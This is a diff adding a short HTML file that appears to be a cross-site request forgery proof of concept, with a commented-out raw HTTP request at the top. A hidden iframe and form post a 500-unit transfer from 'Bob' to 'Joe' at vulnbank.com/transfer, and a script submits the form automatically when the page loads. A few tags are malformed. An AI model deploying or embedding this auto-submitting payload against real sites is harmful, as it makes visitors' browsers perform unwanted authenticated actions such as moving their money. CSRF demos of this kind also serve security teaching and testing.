@@ -1,0 +1,18 @@
+<!-- POST /HTTP/1.1
+Host: www.google.ca
+User-Agent: Mozilla/5.0(Windows NT 6.1; rv:50.0)Gecko/201000101 Firefox/50.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Content-Length:5
+Content-Type:text/plain;charset=UTF-8
+DNT: 1
+Connection: close
+hello
+ -->
+<iframe style="display:none" name="csrf-frame"></iframe>
+<<form method='POST' action='http://vulnbank.com/transfer' target="csrf-frame" accept-charset="utf-8" id="crsf-form">
+	<input type="hidden" name="from" value="Bob">
+	<input type="hidden" name="to" value="Joe">
+	<input type="hidden" name="amount" value="500">
+	<input type="submit" value="submit">
+</form>
+<<script>document.getElementById("crsf-form").submit()</script>
